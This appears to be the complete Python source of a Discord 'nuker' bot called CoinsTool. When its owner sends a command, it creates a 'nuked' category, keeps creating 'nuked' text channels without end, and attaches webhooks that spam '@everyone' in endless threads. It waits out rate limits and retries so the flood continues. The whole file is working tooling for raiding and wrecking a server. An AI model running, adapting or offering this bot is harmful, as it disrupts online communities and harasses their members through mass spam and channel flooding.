category=""
import os
import time
import asyncio
import json
from discord.ext import commands
import threading
import httpx
import discord
ratelimit = False
os.system("title (CoinsTool) Nuker")

with open("configs/nukerconfig.json") as data:
    nukerconfig = json.load(data)
if nukerconfig['token'] == '' or nukerconfig['userid'] == '':
    print("Please edit the nukerconfig.json file and add your bot's token and ur userid to it!")
else:
    token = nukerconfig['token']
    useridlol = nukerconfig['userid']

black = "\033[1;30m"
red = "\033[1;31m"    
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"    
purple = "\033[1;35m"    
cyan = "\033[1;36m"    
white = "\033[1;37m"

os.system("cls || clear")

print(f"""{red}
    
 $$$$$$\            $$\           $$\             
$$  __$$\           \__|          $  |            
$$ /  \__| $$$$$$\  $$\ $$$$$$$\  \_/  $$$$$$$\   
$$ |      $$  __$$\ $$ |$$  __$$\     $$  _____|  
$$ |      $$ /  $$ |$$ |$$ |  $$ |    \$$$$$$\    
$$ |  $$\ $$ |  $$ |$$ |$$ |  $$ |     \____$$\   
\$$$$$$  |\$$$$$$  |$$ |$$ |  $$ |    $$$$$$$  |  
 \______/  \______/ \__|\__|  \__|    \_______/   
$$\   $$\           $$\                           
$$$\  $$ |          $$ |                          
$$$$\ $$ |$$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
$$ $$\$$ |$$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
$$ \$$$$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
$$ |\$$$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
$$ | \$$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
\__|  \__| \______/ \__|  \__| \_______|\__|      {white}
{blue}>lol to nuke{white}""")

x = 0
def increment():
    global x
    x+=1
    return x

def thread_task(lock):
    global green
    global white
    lock.acquire()
    p=increment()
    lock.release()
    print(f"{green}Sent message #{p}!{white}")

def idk():
    global x
    lock = threading.Lock()
    tp = threading.Thread(target=thread_task,args=(lock,))
    tp.start()
    tp.join()
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='>',intents=intents,help_command=None,activity = discord.Game(type=discord.ActivityType.watching,name=">help"))
def spam_webhook(webhook):
    global white
    global red
    while True:
        try:
            url = webhook.url
            data={"content":"@everyone"}
            r=httpx.post(url,json=data)
            if r.status_code == 204:
                idk()
                os.system(f"title (CoinsTool) Nuker - {x} messages sent")
            else:
                sleeptime = r.json()["retry_after"]
                print(f"{purple}Webhook {white}- {red}Rate Limit! {cyan}Sleeping for: {sleeptime}s{white}")
                time.sleep(sleeptime)
        except Exception as e:
            print(e)
            pass
def between(webhook):
    threading.Thread(target=spam_webhook,args=(webhook,)).start()
async def forever_send_msg(channel,retry=False):
    try:
        print(f"{purple}Waiting to create webhook...{white}")
        try:
            webhook = await channel.create_webhook(name="Coin on top!")
            wb = True
        except:
            print(f"{red}Webhook Create - Rate limit, retrying...{white}")
            await asyncio.sleep(10)
            wb=False
            await forever_send_msg2(channel,True)
            pass
        if wb:
            print(f"{green}Created webhook!{white}")
            between(webhook)
    except Exception as e:
        print(red+str(e)+white)
        pass
async def forever_send_msg2(channel,retry=False):
    try:
        print(f"{purple}Waiting to create webhook...{white}")
        try:
            webhook = await channel.create_webhook(name="Coin on top!")
            wb = True
        except:
            print(f"{red}Webhook Create - Rate limit, retrying...{white}")
            await asyncio.sleep(10)
            wb=False
            await forever_send_msg(channel,True)
            pass
        if wb:
            print(f"{green}Created webhook!{white}")
            between(webhook)
    except Exception as e:
        print(red+str(e)+white)
        pass
async def create_channel(guild,name,cat):
    try:
        print(f"{purple}Waiting to create text channel... {white}")
        try:
            channel = await guild.create_text_channel(str(name),category=cat)
            ch = True
        except:
            print(f"{red}Text Channel Create - Rate limit, retrying...{white}")
            await asyncio.sleep(10)
            ch=False
            await create_channel2(guild,name,cat)
            pass
        if ch:
            print(f"{green}Created text channel!{white}")
            await forever_send_msg(channel=channel)
    except Exception as e:
        print(red+str(e)+white)
        pass
async def create_channel2(guild,name,cat):
    try:
        print(f"{purple}Waiting to create text channel... {white}")
        try:
            channel = await guild.create_text_channel(str(name),category=cat)
            ch = True
        except:
            print(f"{red}Text Channel Create - Rate limit, retrying...{white}")
            await asyncio.sleep(10)
            ch=False
            await create_channel(guild,name,cat)
            pass
        if ch:
            print(f"{green}Created text channel!{white}")
            await forever_send_msg(channel=channel)
    except Exception as e:
        print(red+str(e)+white)
        pass
async def nuke(guild):
    global category
    await create_channel(guild=guild,name="nuked",cat=category)
async def start_nuke(guild):
    while True:
        await nuke(guild=guild)
@bot.event
async def on_ready():
    print(f"{bot.user} is ready and online!")
@bot.command()
async def lol(ctx):
    global useridlol
    global category
    print(useridlol)
    print(f"UserID: {ctx.author.id}")
    if str(ctx.author.id) in str(useridlol):
        guild = ctx.guild
        await ctx.send("starting nuke...")
        category = await guild.create_category("nuked")
        await start_nuke(guild=guild)
    else:
        await ctx.send("no perms lol")
bot.run(token)
